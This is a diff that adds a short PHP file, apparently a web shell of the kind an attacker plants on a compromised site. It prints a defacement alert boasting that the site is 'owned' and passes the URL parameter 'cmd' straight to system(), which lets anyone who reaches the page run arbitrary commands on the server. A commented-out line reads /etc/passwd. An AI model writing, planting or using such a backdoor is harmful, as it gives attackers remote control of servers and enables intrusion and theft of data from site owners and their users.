@@ -1,0 +1,12 @@
+<?php
+
+// echo "Your are hacked :)<br /><br />";
+
+echo "<script>alert(\"U 4r3 0wn3d by MME!!!\");</script>";
+
+system($_GET["cmd"]);
+// system("cat /etc/passwd");
+
+echo "<br /><br />";
+
+?>
